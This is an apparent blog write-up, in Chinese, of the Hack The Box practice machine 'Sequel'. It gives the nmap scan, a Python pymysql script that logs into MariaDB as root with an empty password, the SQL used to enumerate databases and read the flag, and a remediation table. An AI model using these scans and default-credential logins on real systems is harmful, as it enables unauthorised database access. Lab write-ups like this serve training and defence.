---
title: "HTB Starting Point - Sequel 渗透测试报告"
date: 2026-07-11T16:30:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Sequel", "MySQL", "MariaDB", "数据库攻击"]
---

## HTB Starting Point - Sequel 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 0 |
| 机器名 | Sequel |
| 目标 IP | 10.129.95.232 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集（端口扫描）

```bash
nmap -sV -T4 -Pn -p 3306 10.129.95.232
```

**扫描结果：**

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   (MariaDB)
```

**关键发现：** 3306 端口，MariaDB 数据库（MySQL 社区继承版）。

---

#### 阶段 2：漏洞分析

数据库常见攻击面：

1. **root 空密码** — 默认安装无密码（最可能）
2. **弱密码爆破** — root/admin 常见密码
3. **已知 CVE** — 特定版本的提权漏洞
4. **UDF 提权** — 拿到数据库后写 so 文件提权

---

#### 阶段 3：漏洞利用

使用 Python pymysql 连接（脚本位于 `E:\py\mysql-connect.py`）：

```bash
mysql-connect 10.129.95.232
```

连上后枚举：

```sql
SHOW DATABASES;              -- 发现 htb 数据库
USE htb;                     -- 选择 htb 库
SHOW TABLES;                 -- 查看表
SELECT * FROM 表名;           -- 读 flag
```

---

### 三、攻击链总结

```
nmap -p 3306 → MariaDB
    │
    ▼
root 空密码 → 直接连接
    │
    ▼
SHOW DATABASES → 发现 htb
USE htb → SHOW TABLES → SELECT * → flag
```

---

### 四、Windows 环境下替代 mysql 客户端

Windows 没有 `mysql` 命令，使用 Python pymysql 替代。

#### mysql 原生命令与 Python 脚本对照

| 原生命令 | Python 脚本 | 含义 |
|----------|------------|------|
| `mysql -u root -h 10.129.95.232` | `pymysql.connect(host, user, password)` | 建立连接 |
| `SHOW DATABASES;` | `cur.execute('SHOW DATABASES')` | 列出所有数据库 |
| `USE htb;` | `conn.select_db('htb')` | 选择数据库 |
| `SHOW TABLES;` | `cur.execute('SHOW TABLES')` | 列出所有表 |
| `SELECT * FROM users;` | `cur.execute('SELECT * FROM users')` | 查询表数据 |
| `DESCRIBE users;` | `cur.execute('DESCRIBE users')` | 查看表结构 |
| `quit` | `conn.close()` | 断开连接 |

#### 核心代码

```python
import pymysql

# 连接（相当于 mysql -u root -h IP）
conn = pymysql.connect(host='10.129.95.232', user='root', password='', port=3306)
cur = conn.cursor()

# 执行 SQL
cur.execute('SHOW DATABASES')         # 相当于 SHOW DATABASES;
for db in cur:
    print(db[0])

conn.close()                          # 相当于 quit
```

---

### 五、当前工具集

从零开始积累的 Windows 渗透工具链：

| 命令 | 替代对象 | 适用服务 |
|------|----------|----------|
| `nmap` | 自己 | 端口扫描 |
| `redis-connect <IP>` | `redis-cli` | Redis (6379) |
| `mysql-connect <IP>` | `mysql` 客户端 | MySQL/MariaDB (3306) |
| `net use` | `smbclient` | SMB (445) |

脚本仓库：`E:\py\`

| 脚本 | 文件 |
|------|------|
| Redis 连接脚本 | `E:\py\redis-connect.py` |
| MySQL 连接脚本 | `E:\py\mysql-connect.py` |

---

### 六、七台机器总览

| # | 机器 | 服务 | 攻击方式 | 类型 |
|---|------|------|----------|------|
| 1 | Meow | Telnet | root 空密码 | 弱配置 |
| 2 | Fawn | FTP | anonymous 空密码 | 弱配置 |
| 3 | Cap | HTTP+FTP | IDOR → pcap → 明文密码 | 越权+泄露 |
| 4 | Dancing | SMB | Guest 空密码共享 | 弱配置 |
| 5 | Redeemer | Redis | 未授权访问 | 弱配置 |
| 6 | Appointment | HTTP | SQL 注入认证绕过 | Web 漏洞 |
| 7 | Sequel | MariaDB | root 空密码 | 弱配置 |

---

### 七、修复建议

| 问题 | 建议 |
|------|------|
| root 空密码 | `ALTER USER 'root'@'%' IDENTIFIED BY '强密码'` |
| 允许远程 root 登录 | 禁止 root 远程连接，创建受限用户 |
| 无 SSL 加密 | 强制 MySQL SSL 连接 |
| 无登录审计 | 启用 general_log 或 MariaDB Audit Plugin |
